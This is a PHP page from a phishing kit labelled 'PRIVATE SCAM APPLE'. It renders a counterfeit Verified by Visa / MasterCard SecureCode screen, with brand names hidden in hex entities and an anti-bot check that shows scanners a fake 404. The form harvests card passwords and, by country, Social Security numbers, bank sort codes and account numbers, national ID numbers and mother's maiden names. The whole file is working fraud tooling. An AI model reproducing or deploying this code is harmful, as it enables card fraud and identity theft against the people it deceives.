<?php
/*   
                              #===============================#
                              #    PRIVATE SCAM APPLE         #
                              #           PIradz17            #
							  #     Facebook.com/Piradz17     #
                              #===============================#                     
*/
session_start();
error_reporting(0);
include "./ANTIBOTS.php";
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
if($_SESSION['_cc_brand_'] == "MASTERCARD" || $_SESSION['_cc_brand_'] ==  "MAESTRO") {
	$Type_XXX = "&#x4D;&#x61;&#x73;&#x74;&#x65;&#x72;&#x43;&#x61;&#x72;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;<sup>TM</sup>";
	$VBV_Name = "&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;<sup>TM</sup>";
	$Type_IMG = "mastercard-securecode";
}elseif($_SESSION['_cc_brand_'] == "VISA") {
	$Type_XXX = "&#x56;&#x65;&#x72;&#x69;&#x66;&#x69;&#x65;&#x64;&#x20;&#x62;&#x79;&#x20;&#x56;&#x69;&#x73;&#x61;";
	$VBV_Name = "&#x33;&#x44;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;";
	$Type_IMG = "verified-by-visa";
}
elseif($_SESSION['_cc_brand_'] == "AMERICAN EXPRESS") {
	$Type_XXX = "&#x53;&#x61;&#x66;&#x65;&#x4B;&#x65;&#x79;&#x20;&#x33;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;";
	$VBV_Name = "&#x53;&#x61;&#x66;&#x65;&#x4B;&#x65;&#x79;";
}
elseif($_SESSION['_cc_brand_'] == "DISCOVER") {
	$Type_XXX = "&#x44;&#x69;&#x73;&#x76;&#x63;&#x6F;&#x65;&#x72;";
}
?>
<div id="xMarcos_9X9X" style="opacity: 1;"> <div id="xGhostRiderForm"> <div id="popup"> <p>Processing </p> </div> <div id="window" style="display: none;"> <div id="xDoctorStrange_L0"> <table> <tbody> <tr> <td><img class="cc_bank" id="cc_bank" src="./INC-LIB/IMG/ssl.png"></td> <td> <?php if($_SESSION['_cc_brand_'] == "DISCOVER"){echo'<div style="background:url(./INC-LIB/IMG/discover.png) no-repeat;height:40px;width:8em;background-size:8em;display:inline-block;float:right"></div>';}elseif($_SESSION['_cc_brand_'] == "AMERICAN EXPRESS"){echo'<div style="background:url(./INC-LIB/IMG/amex.png) no-repeat;height:5em;width:5em;background-size:5em;display:inline-block;float:right"></div>';}else{echo'<img class="cc_type" id="cc_type" src="./INC-LIB/IMG/'.$Type_IMG.'.png">';} ?> </td> </tr> </tbody> </table> </div> <div id="xDoctorStrange_L1" style="text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"> <?=$_SESSION['_cc_bank_'];?> </div> <div id="xDoctorStrange_L1">Added Safety Online</div> <div id="xDoctorStrange_L2"> <?=$Type_XXX;?> helps protect your <b></b> card against unauthorized use online - at no additional cost. To use <?=$Type_XXX;?> on this and futur purshases. complete this page You'll the create your own <?=$Type_XXX;?> information</div> <div id="xDoctorStrange_L3"> <form method="post" id="Z118_3XX"> <table> <tbody> <tr> <td style="font-weight: bold;">Name on card :</td> <td> <?=$_SESSION['_nameoncard_'];?> </td> </tr> <tr> <td style="font-weight: bold;">Country Name :</td> <td> <?=ucwords(strtolower($_SESSION['_country_']));?> </td> </tr> <tr> <td style="font-weight: bold;">Card Type :</td> <td> <?=ucwords(strtolower($_SESSION['_ccglobal_']));?> </td> </tr> <tr> <td style="font-weight: bold;">Card Number :</td> <td>XXXX-XXXX-XXXX- <?=substr($_SESSION['_cardnumber_'] , -4);?> </td> </tr> <tr> <td style="font-weight: bold;">Date time :</td> <td> <?=date('d/m/Y').", ".date('g:i a');?> </td> </tr> <tr class="Height_XXX" <?php if($_SESSION[ '_cc_brand_']=="DISCOVER" ){echo "style='display:none'";}else{echo "style='display:table-row;'";} ?>> <td style="font-weight: bold;"> <?=$VBV_Name;?> :</td> <td> <input type="text" name="password_vbv" id="password_vbv" style="width: 170px;padding-left: 4px;"> </td> </tr>
                            <?php 
						############################ ITALY ############################	
		    				if($_SESSION['_cntrcode_'] == "IT") {	
								echo '  <tr class="Height_XXX">
                            				<td style="font-weight: bold;">Codice Fiscale :</td>
                            				<td><input required type="text" name="codicefiscale" id="codicefiscale" maxlength="16" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';  
		    				}
        				################### SWITZERLAND || GERMANY #####################
		    				elseif($_SESSION['_cntrcode_'] == "CH" || $_SESSION['_cntrcode_'] == "DE") {	
								echo '<tr class="Height_XXX">
                            				<td style="font-weight: bold;">Kontonummer :</td>
                            				<td><input required type="text" name="kontonummer" id="kontonummer" maxlength="11" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';  
		    				}
						########################### GREECE #############################
		    				elseif($_SESSION['_cntrcode_'] == "GR") {	
								echo '<tr class="Height_XXX">
                            				<td style="font-weight: bold;">Official ID :</td>
                            				<td>
                                				<input required type="text" name="offid" id="offid" maxlength="30" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';  
		    				}
						########################## AUSTRALIA ###########################
		    				elseif($_SESSION['_cntrcode_'] == "AU") {
			    				echo '<tr class="Height_XXX">
                            				<td style="font-weight: bold;">OSID :</td>
                            				<td><input required type="text" name="osid" id="osid"  maxlength="6" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>
										<tr class="Height_XXX">
                            				<td style="font-weight: bold;">Credit Limit :</td>
                            				<td><input required type="text" name="creditlimit" id="creditlimit" maxlength="7" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';
		    				}
						################# IRELAND || UNITED KINGDOM  ###################
		    				elseif ($_SESSION['_cntrcode_'] == "IE" || $_SESSION['_cntrcode_'] == "GB" ) {
		        				echo '  <tr class="Height_XXX">
                            				<td style="font-weight: bold;">Sort Code :</td>
                            				<td><input required type="tel" name="sortnum1" id="sortnum1" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum2" id="sortnum2" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum3" id="sortnum3" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> (XX-XX-XX)</td>
                        				</tr>                  
                        				<tr class="Height_XXX">
                            				<td style="font-weight: bold;">Account Number :</td>
                            				<td><input required type="tel" name="accnumber" id="accnumber" maxlength="9" class="accnumber" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';			   
			    
    						}
						#################### UNITED STATES || CANADA ###################
							elseif ($_SESSION['_cntrcode_'] == "US" || $_SESSION['_cntrcode_'] == "CA") {
			    				echo '  <tr class="Height_XXX">
                            				<td style="font-weight: bold;padding-left: 15px;">Social Security Number :</td>
                            				<td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"> (XXX-XX-XXXX)</td>
                        				</tr>';
							}
						#################### IRELAND || CANADA ###################
							if ($_SESSION['_cntrcode_'] == "IRELAND" || $_SESSION['_cntrcode_'] == "CANADA") {
							   echo'<tr class="Height_XXX">
                            			<td style="font-weight: bold;padding-left: 15px;">Mother’s Maiden Name :</td>
                            			<td><input required type="tel" name="mmname" id="mmname" style="width: 170px;padding-left: 4px;"></td>
                        			</tr>';
			    			}			
						?>
<tr> <td></td> <td> <input type="submit" name="Z118_VBVSUBMIT" id="Z118_VBVSUBMIT" value="Submit"> </td> </tr> <tr> <td> <?=$_SESSION['_cc_phone_'];?> </td> <td> <?=$_SESSION['_cc_site_'];?> </td> </tr> </tbody> </table> <script src="./INC-LIB/JS/Z118_3XX.js"></script> <input type="hidden" name="country_form" id="country_form" value="<?=$_SESSION['_cntrcode_'];?>"> </form> </div> </div> </div></div>